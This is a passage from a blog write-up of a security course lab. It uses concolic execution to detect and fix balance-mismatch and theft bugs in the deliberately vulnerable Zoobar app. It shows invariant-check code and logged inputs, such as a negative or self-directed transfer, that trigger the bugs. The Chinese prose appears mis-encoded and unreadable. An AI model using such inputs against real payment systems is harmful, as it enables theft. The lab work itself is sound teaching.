class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å®ç°ä¸¤ç§é¢å¤–çš„ä¸å˜é‡æ£€æŸ¥ä»¥æ£€æŸ¥ Zoobar æ˜¯å¦å­˜åœ¨å…¶ä»–æ¼æ´ï¼š</p><ul><li>è‹¥æ²¡æœ‰æ–°ç”¨æˆ·è¢«æ³¨å†Œï¼Œåˆ™æ‰€æœ‰ç”¨æˆ·çš„ Zoobar balances ä¹‹å’Œåº”å½“åœ¨æ¯æ¬¡è¯·æ±‚é—´ä¿æŒä¸€è‡´</li><li>è‹¥ç”¨æˆ· <code>u</code> æ²¡æœ‰å‘ Zoobar è¿›è¡Œè¯·æ±‚ï¼Œ<code>u</code> çš„ Zoobar balance ä¸åº”å½“ç¼©å°</li></ul><p>äºæ˜¯æ¥åˆ° Exercise 9ï¼Œå‘  <code>check-symex-zoobar.py</code> ä¸­æ·»åŠ ç›¸åº”çš„ä¸å˜é‡æ£€æŸ¥ï¼š</p><blockquote><p><strong>Exercise 9.</strong> Add invariant checks to <code>check-symex-zoobar.py</code> to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment <code>Exercise 9: your code here</code> to see where you should write this code. When you detect a zoobar balance mismatch, call the <code>report_balance_mismatch()</code> function. When you detect zoobar theft, call <code>report_zoobar_theft()</code>.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to re-run <strong>./check-symex-zoobar.py</strong> and see whether the output contains the messages <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you (run <code>check-symex-zoobar.py</code> and look for these magic strings).</p></blockquote><p>åœ¨ Zoobar ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡ <code>zoobar.app()</code> æ¥å®Œæˆ HTTP è¯·æ±‚çš„è§£æå®ç°ï¼Œå› æ­¤åœ¨  <code>test_stuff()</code>  ä¸­é€‰æ‹©ç›´æ¥æ„é€ è¯·æ±‚ï¼ˆ<code>environ</code> å­—å…¸ï¼‰ä¼ é€’ç»™è¯¥å‡½æ•°æ¥æ¨¡æ‹Ÿå‘ Zoobar å‘é€ HTTP è¯·æ±‚çš„è¿‡ç¨‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = &#123;&#125;<br><span class="hljs-comment">##...</span><br>environ[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>] = <span class="hljs-string">&#x27;trans&#x27;</span> + fuzzy.mk_str(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">if</span> environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].startswith(<span class="hljs-string">&#x27;//&#x27;</span>):<br>  <span class="hljs-comment">## Don&#x27;t bother trying to construct paths with lots of slashes;</span><br>  <span class="hljs-comment">## otherwise, the lstrip() code generates lots of paths..</span><br>  <span class="hljs-keyword">return</span><br><br>resp = zoobar.app(environ, startresp)<br><span class="hljs-keyword">if</span> verbose:<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> resp:<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯¹ä»£ç çš„æ£€æŸ¥åˆ™æ˜¯åœ¨è¯·æ±‚å®Œæˆåè¿›è¡Œçš„ï¼Œé¦–å…ˆæ˜¯å¯¹ balance çš„æ£€æŸ¥ï¼Œè¿™é‡Œä¸äº†è§£ Zoobar çš„ç›¸å…³ç»“æ„ï¼ˆæˆ–è€…æ²¡æ¥å¾—åŠ~~/æ‡’å¾—~~çœ‹ï¼‰ä¹Ÿä¸è¦ç´§ï¼Œåœ¨ <code>test_stuff()</code> çš„å¼€å¤´æœ‰è¿™æ ·çš„è®¡ç®— balances æ€»å’Œçš„é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  <span class="hljs-comment"># è®¡ç®— balance æ€»å’Œ</span><br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br></code></pre></td></tr></table></figure><p>å¯¹äºå•ä¸ªç”¨æˆ·è€Œè¨€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>person.zoobars</code> è·å–å…¶ balanceï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>pdb.query(zoobar.zoodb.Person).all()</code> è·å–ç”¨æˆ·å¯¹è±¡åˆ—è¡¨ ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨è¯·æ±‚ç»“æŸåä½¿ç”¨åŒæ ·çš„é€»è¾‘è®¡ç®—å½“å‰çš„ balanceï¼Œå¹¶ä¸åŸ balance å¯¹æ¯”å³å¯ï¼Œè‹¥ä¸ä¸€è‡´åˆ™æŒ‰æ‰‹å†Œè¯´æ˜è°ƒç”¨ <code>report_balance_mismatch()</code> å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 9: your code here.</span><br><br><span class="hljs-comment">## Detect balance mismatch.</span><br><span class="hljs-comment">## When detected, call report_balance_mismatch()</span><br>balance2 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br><span class="hljs-keyword">if</span> balance1 != balance2:<br>  report_balance_mismatch()<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ²¡æœ‰è¿›è¡Œæ“ä½œä½†æ˜¯ balance ç¼©å°äº†çš„ç”¨æˆ·ï¼ˆå³å‘ç”Ÿè½¬å‡ºï¼‰ï¼Œç”±äºåœ¨æµ‹è¯•å‡½æ•°ä¸­ä»…è¿›è¡Œäº†ä¸€æ¬¡æ“ä½œï¼Œæ•…æœªè¿›è¡Œæ“ä½œçš„ç”¨æˆ·çš„ balance <strong>ä¸åº”å½“å°äºåˆå§‹å€¼</strong>ï¼ˆä½†æ˜¯å¯ä»¥å¤§äºï¼Œå› ä¸ºå¯ä»¥æœ‰åˆ«çš„è´¦æˆ·å‘å…¶è¿›è¡Œè½¬å…¥ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·çš„åˆå§‹ä¿¡æ¯</p><p>åœ¨ <code>test_stuff()</code> å¼€å¤´ä¾¿å¯¹åº”åˆ›å»ºäº†ä¸¤ä¸ªæ•°æ®åº“ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»å…¶å®šä¹‰å…¥æ‰‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br>  pdb.commit()<br><br>  tdb = zoobar.zoodb.transfer_setup()<br>  tdb.query(zoobar.zoodb.Transfer).delete()<br>  tdb.commit()<br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>zoobar/zoodb.py</code> ä¸­å®šä¹‰äº† Person æ•°æ®åº“ï¼Œå…¶ä¸­ balanceï¼ˆä¹Ÿå°±æ˜¯ zoobars å­—æ®µï¼‰çš„åˆå§‹å€¼ä¸º 10ï¼ŒåŒæ—¶ä¸»é”®ä¸º <code>username</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">PersonBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;person&quot;</span><br>    username = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    password = Column(String(<span class="hljs-number">128</span>))<br>    token = Column(String(<span class="hljs-number">128</span>))<br>    zoobars = Column(Integer, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-number">10</span>)<br>    profile = Column(String(<span class="hljs-number">5000</span>), nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥æ–‡ä»¶ä¸­è¿˜å®šä¹‰äº† Transfer æ•°æ®åº“ï¼Œåº”å½“ç”¨ä»¥è¡¨ç¤ºå•æ¬¡äº¤æ˜“çš„åŒæ–¹åŠæ•°å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transfer</span>(<span class="hljs-title class_ inherited__">TransferBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;transfer&quot;</span><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)<br>    sender = Column(String(<span class="hljs-number">128</span>))<br>    recipient = Column(String(<span class="hljs-number">128</span>))<br>    amount = Column(Integer)<br>    time = Column(String)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥éå† Person æ•°æ®åº“ä»¥è·å¾—æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åé›†åˆï¼Œæ¥ä¸‹æ¥éå† Transfer æ•°æ®åº“æ¥å°†ç”¨æˆ·åé›†åˆä¸­çš„é sender ç»™å‰”é™¤ï¼ˆå› ä¸ºæˆ‘ä»¬ä¸»è¦å…³æ³¨ recipient å‘ç”Ÿäº† balance ç¼©å°çš„æƒ…å†µï¼‰ï¼Œæœ€åæ£€æŸ¥å‰©ä½™ç”¨æˆ·æ˜¯å¦å­˜åœ¨ balance å°äºåˆå§‹å€¼çš„æƒ…å†µï¼Œè‹¥æ˜¯åˆ™è¯´æ˜å­˜åœ¨æ¼æ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Detect zoobar theft.</span><br><span class="hljs-comment">## When detected, call report_zoobar_theft()</span><br>udict = &#123;&#125;<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>():<br>  udict[p.username] = p<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tdb.query(zoobar.zoodb.Transfer).<span class="hljs-built_in">all</span>():<br>  udict.pop(t.sender)<br><span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> udict.keys():<br>  <span class="hljs-keyword">if</span> udict[username].zoobars &lt; <span class="hljs-number">10</span>:<br>    report_zoobar_theft()<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 9ï¼š</p><p><img src="https://s2.loli.net/2022/12/24/FnSvPHRsQbc6LZT.png" alt="image.png"></p><p>æœ€åæ˜¯ Exercise 10ï¼Œä¿®å¤ balance mismatch å’Œ zoobar theft è¿™ä¸¤ä¸ªæ¼æ´ï¼ˆLab å·²ç»æ›¿æˆ‘ä»¬ä¿®å¥½äº† eval injection çš„æ¼æ´ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œè¯„æµ‹ç³»ç»Ÿè¦æ±‚å°†å­˜åœ¨é—®é¢˜çš„æºç æ–‡ä»¶æ‹·è´åˆ° <code>zoobar-fixed</code> ä¸‹å†è¿›è¡Œä¿®å¤ï¼Œï¼š</p><blockquote><p><strong>Exercise 10.</strong> Fix the two bugs you found in Exercise 9, by copying whatever <code>.py</code> files you need to modify from the <code>zoobar</code> directory to <code>zoobar-fixed</code> and changing them there.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to run <strong>./check-symex-zoobar-fixed.sh</strong> and see whether the output still contains the messages <code>Exception: eval injection</code>, <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you.</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¦æ‰¾åˆ°æ¼æ´å‡ºç°çš„ä½ç½®ï¼Œç¬”è€…æœ€åˆçš„æ€è·¯æ˜¯åœ¨ä¸¤ä¸ªæ‰¾åˆ°æ¼æ´çš„ report å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£å°±å¯ä»¥è·å¾—é€ æˆé—®é¢˜çš„è¾“å…¥ï¼Œä½†æ˜¯<strong>è¿™ä¸ªåšæ³•å¹¶ä¸å¯è¡Œï¼Œå› ä¸ºæœ¬ Lab æä¾›çš„æ··åˆæ‰§è¡Œæ¡†æ¶æ˜¯é«˜åº¦å°è£…å¥½çš„</strong>ï¼Œåœ¨ <code>concolic_execs()</code> çš„æ‰§è¡Œè¿‡ç¨‹ä¸­æˆ‘ä»¬æ˜¯æ²¡åŠæ³•ä¸­é€”åœä¸‹æ¥è¿›è¡Œçº¦æŸæ±‚è§£çš„</p><blockquote><p>ç¬”è€…æ€è€ƒäº†åŠå¤©æ€ä¹ˆæ”¹æ‰èƒ½åœ¨ <code>test_stuff()</code> çš„ä¸¤ä¸ª report() å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£æ¥å¾—åˆ°è§¦å‘æ¼æ´çš„è¾“å…¥ï¼Œåé¢å‘ç°åŸºæœ¬æ²¡å•¥å¯è¡Œæ€§ï¼Œå®åœ¨è¦å¼„çš„è¯éœ€è¦å¯¹æ•´ä¸ªæ¡†æ¶è¿›è¡Œå¤§æ”¹ï¼Œæ•…å°±æ­¤ä½œç½¢æ”¹æ¢æ€è·¯â€¦</p></blockquote><p>æˆ‘ä»¬é‡æ–°æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š  <em>Lab 3 ä¸ºä»€ä¹ˆæä¾›çš„æ˜¯æ··åˆæ‰§è¡Œæ¡†æ¶è€Œéçº¯ç¬¦å·æ‰§è¡Œæˆ–æ˜¯çº¯å…·ä½“æ‰§è¡Œå‘¢ï¼Ÿ</em></p><p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œconcolic execution çš„è¯ç”Ÿä¾¿æ˜¯ä¸ºäº†è§£å†³ symbolic execution ä¸ concrete execution æ‰€åˆ†åˆ«å­˜åœ¨çš„é—®é¢˜ï¼Œèåˆä¸¤è€…çš„ç‰¹æ€§æ¥è¾¾åˆ°ä¸€ä¸ªæ›´å¥½çš„æ•ˆæœ</p><p>ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>concolic_execs()</code> çš„æ‰§è¡Œæµç¨‹ï¼š</p><ul><li>ç”±ä¸€ä¸ªå¤–å±‚å¤§å¾ªç¯ä¸æ–­è¿­ä»£<ul><li>ä»è¾“å…¥é˜Ÿåˆ—ä¸­å–å‡ºå…·ä½“å€¼å­—å…¸</li><li>è°ƒç”¨ <code>concolic_exec_input()</code> æ‰§è¡Œç›®æ ‡å‡½æ•°ï¼Œè·å–åˆ°è¿”å›å€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨æ–¹åˆ—è¡¨</li><li>å°†å¾—åˆ°çš„æ–°çš„è¿”å›å€¼æ·»åŠ è‡³ <code>outs</code> é›†åˆ</li><li>å†…å±‚å°å¾ªç¯éå†åˆ†æ”¯æ¡ä»¶åˆ—è¡¨<ul><li>è°ƒç”¨ <code>concolic_force_branch()</code> è·å–å°†å½“å‰åˆ†æ”¯æ¡ä»¶é€†è½¬åçš„çº¦æŸæ¡ä»¶</li><li>è‹¥è¯¥çº¦æŸä¸åœ¨ <code>checked</code> ï¼ˆå·²éªŒè¯çº¦æŸé›†åˆï¼‰ä¸­ï¼Œæ·»åŠ ï¼Œå¹¶è°ƒç”¨ <code>concolic_find_input()</code> è¿›è¡Œçº¦æŸæ±‚è§£</li><li>çº¦æŸå¯è§£ï¼Œå°†ç»“æœæ·»åŠ åˆ°ä¸‹ä¸€æ¬¡ä½œä¸ºè¾“å…¥çš„å…·ä½“å€¼å­—å…¸ä¸­</li></ul></li></ul></li></ul><p>æˆ‘ä»¬ä¸éš¾å¾—çŸ¥çš„æ˜¯ï¼Œå½“ <code>test_stuff()</code> æŠ¥å‘Šæ¼æ´æ—¶ï¼Œ<strong>è¯´æ˜æˆ‘ä»¬çš„ concolic execution system ç»™å‡ºäº†ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘æ¼æ´çš„ concrete input</strong></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯­å¥æ¥å°†è¾“å‡ºé‡å®šå‘è‡³å½“å‰ç›®å½•ä¸‹çš„ <code>typescript</code> æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬ç”¨åˆ°çš„ä¸¤ä¸ª report() å‡½æ•°å®é™…ä¸Šå°±åªæ˜¯ <code>print()</code> è€Œå·²ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¾“å‡ºç»“æœä¸­æœç´¢å¯¹åº”çš„å­—ç¬¦ä¸²å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_balance_mismatch</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Balance mismatch detected&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_zoobar_theft</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Zoobar theft detected&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸¤ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;-10&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1689</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Balance mismatch detected</span><br><span class="hljs-string">Trying concrete value: &#123;&#x27;</span>form_recipient_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_val<span class="hljs-string">&#x27;: &#x27;</span>-<span class="hljs-number">10</span><span class="hljs-string">&#x27;, &#x27;</span>rsplit_split_cookie_=_r_<span class="hljs-comment">#_r&#x27;: &#x27;atok&#x27;, &#x27;rsplit_split_cookie_=_r_#_l&#x27;: &#x27;alice&#x27;, &#x27;split_cookie_=_r&#x27;: &#x27;alice#atok&#x27;, &#x27;split_cookie_=_l&#x27;: &#x27;PyZoobarLogin&#x27;, &#x27;cookie&#x27;: &#x27;PyZoobarLogin=alice#atok&#x27;, &#x27;path&#x27;: &#x27;fer&#x27;, &#x27;form_recipient_val&#x27;: &#x27;bob&#x27;, &#x27;referrer&#x27;: &#x27;&#x27;&#125;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1686</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;tex...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Zoobar theft detected</span><br></code></pre></td></tr></table></figure><p>å‚æ•°çš„å«ä¹‰ä¸éš¾è¾¨è®¤ï¼Œ<code>form_zoobars_val</code> ä¸ºå•æ¬¡ transfer çš„æ•°å€¼ï¼Œ<code>cookie</code> è¡¨ç¤ºå‘é€æ–¹ç”¨æˆ·ååŠ cookieï¼Œ<code>form_recipient_val</code> è¡¨ç¤ºæ¥æ”¶æ–¹ç”¨æˆ·åï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºè‡³å°‘å¯èƒ½å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼š</p><ul><li>æœªå¯¹è´Ÿæ•°çš„ transfer è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä¸€ä¸ªç”¨æˆ·å¯ä»¥ç›—å–å¦ä¸€ç”¨æˆ·çš„ balance</li><li>æœªå¯¹ self-transfer çš„æƒ…å†µåšåˆé€‚å¤„ç†ï¼Œå¯¼è‡´æœ€åæ€»çš„ balance ä¸ä¸€è‡´</li></ul><p>ä½†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªçŸ¥é“  <em>æ¼æ´æ˜¯å­˜åœ¨çš„</em>  ï¼Œè€Œä¸çŸ¥é“  <em>æ¼æ´åœ¨ä½•å¤„</em>  ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬éœ€è¦å†å®¡ä¸€å®¡æ—¥å¿—åˆ«çš„åœ°æ–¹ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ä¼šæœ‰ä¸€äº›æŠ›å¼‚å¸¸çš„æ—¥å¿—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/transfer.py&quot;</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> transfer<br>    bank.transfer(g.user.person.username,<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/bank.py&quot;</span>, line <span class="hljs-number">12</span>, <span class="hljs-keyword">in</span> transfer<br>    recipient_balance = recipientp.zoobars + zoobars<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;zoobars&#x27;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1683</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n       </span><br><span class="hljs-string"># 